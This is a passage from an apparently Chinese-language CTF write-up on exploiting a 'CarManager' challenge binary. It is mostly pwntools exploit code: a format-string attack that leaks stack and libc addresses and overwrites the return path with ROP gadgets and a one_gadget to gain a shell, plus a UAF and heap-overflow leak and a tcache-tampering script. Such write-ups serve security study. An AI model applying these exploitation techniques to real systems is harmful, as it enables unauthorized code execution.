class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_car</span>(<span class="params">size,data2,data1=<span class="string">&quot;a&quot;</span>,name=<span class="string">&quot;1&quot;</span>,price=<span class="number">1</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;Car Name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;price:&quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data1)</span><br><span class="line">    sla(<span class="string">&quot;introduction size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;introduction data:&quot;</span>,data2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_car</span>(<span class="params">size,data2,data1=<span class="string">&quot;a&quot;</span>,name=<span class="string">&quot;1&quot;</span>,price=<span class="number">1</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sla(<span class="string">&quot;Car Name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;price:&quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data1)</span><br><span class="line">    sla(<span class="string">&quot;introduction size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;introduction data:&quot;</span>,data2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_car</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_car</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>)) </span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">publish_topic</span>(<span class="params">title,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))  </span><br><span class="line">    sla(<span class="string">&quot;title&quot;</span>,title)</span><br><span class="line">    sla(<span class="string">&quot;content size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_topic</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;comment size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;comment data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_topic</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_topic</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">add_car(<span class="number">0x30</span>,<span class="string">&quot;%p%23$p&quot;</span>)</span><br><span class="line">show_car()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Car Intro: 0x&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;0x&quot;</span>))</span><br><span class="line">stack_base = stack_addr + <span class="number">0x26a0</span></span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x24083</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdx_rcx_rbx_ret = libc_base + <span class="number">0x000000000010257d</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">one_gadgets = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">1</span>] + libc_base</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    magic_stackp = (stack_base+<span class="number">0x58</span>+<span class="number">2</span>*i) % <span class="number">0x10000</span></span><br><span class="line">    magic_gadgetp = (pop_rdx_rcx_rbx_ret&gt;&gt;i*<span class="number">16</span>) % <span class="number">0x10000</span></span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%16$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stackp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%20$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadgetp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    magic_stackp = (stack_base+<span class="number">0x58</span>+<span class="number">2</span>*i+<span class="number">8</span>*<span class="number">4</span>) % <span class="number">0x10000</span></span><br><span class="line">    magic_gadgetp = (pop_rdx_ret&gt;&gt;i*<span class="number">16</span>) % <span class="number">0x10000</span></span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%16$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stackp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%20$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadgetp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    magic_stackp = (stack_base+<span class="number">0x58</span>+<span class="number">2</span>*i+<span class="number">8</span>*<span class="number">6</span>) % <span class="number">0x10000</span></span><br><span class="line">    magic_gadgetp = (one_gadget&gt;&gt;i*<span class="number">16</span>) % <span class="number">0x10000</span></span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%16$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stackp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%20$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadgetp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路 - UAF+堆溢出</strong></p>
<p>利用 UAF 也可以完成泄露，但是需要注意技巧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; size &gt; i; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)read(<span class="number">0</span>, &amp;a1[i], <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1[i] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所有的输入函数都会对末尾的 <code>\n</code> 进行置空，而所有的输出都会被 <code>\x00</code> 截断，此时遗留在堆上的地址就无法被打印</p>
<p>可以用如下技巧绕过这个限制：（输入刚好合适的 size，使 <code>\n</code> 读取不进来）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Register(<span class="string">&quot;name&quot;</span>,<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add_car(<span class="number">0x680</span>,<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">publish_topic(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>,<span class="number">0x20</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">dele_car()</span><br><span class="line"></span><br><span class="line">add_car(<span class="number">0x480</span>,<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">dele_car()</span><br><span class="line"></span><br><span class="line">add_car(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>,size2=<span class="number">0x470</span>)</span><br><span class="line">show_car()</span><br><span class="line">ru(<span class="string">&quot;Car Intro: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ed031</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit_car(<span class="number">16</span>,<span class="string">&quot;2&quot;</span>*<span class="number">16</span>,size2=<span class="number">0x470</span>)</span><br><span class="line">show_car()</span><br><span class="line">ru(<span class="string">&quot;Car Intro: 2222222222222222&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x820</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>利用堆溢出我们可以修改 next chunk-&gt;size，将其释放就可以实现堆重叠，重新申请回来就可以修改 tcache 了</p>
<p>非完整 exp 如下：（没有写有关逆向的部分）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./CarManager_bug1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;175.22.1.46&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x264E)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">control</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_user</span>(<span class="params">name,size,data,passwd=<span class="string">&quot;passwd&quot;</span>,phone=<span class="string">&quot;123&quot;</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;username: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password: &quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;username: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password: &quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;phoneNum:&quot;</span>,phone)</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Register</span>(<span class="params">name,size,data,passwd=<span class="string">&quot;passwd&quot;</span>,phone=<span class="string">&quot;123&quot;</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;username:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password:&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;phoneNum:&quot;</span>,phone)</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_user</span>(<span class="params">name,passwd=<span class="string">&quot;passwd&quot;</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;username:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password:&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_car</span>(<span class="params">size,data,size2=<span class="number">0</span>,data2=<span class="string">&quot;a&quot;</span>,name=<span class="string">&quot;1&quot;</span>,price=<span class="number">1</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;Car Name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;price:&quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    <span class="keyword">if</span>(size2 == <span class="number">0</span>):</span><br><span class="line">        size2 = size</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data2)</span><br><span class="line">    sla(<span class="string">&quot;introduction size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;introduction data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_car</span>(<span class="params">size,data,size2=<span class="number">0</span>,data2=<span class="string">&quot;a&quot;</span>,name=<span class="string">&quot;1&quot;</span>,price=<span class="number">1</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sla(<span class="string">&quot;Car Name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;price:&quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    <span class="keyword">if</span>(size2 == <span class="number">0</span>):</span><br><span class="line">        size2 = size</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data2)</span><br><span class="line">    sla(<span class="string">&quot;introduction size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;introduction data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_car</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_car</span>():</span></span><br><span class="line">    sla(<span 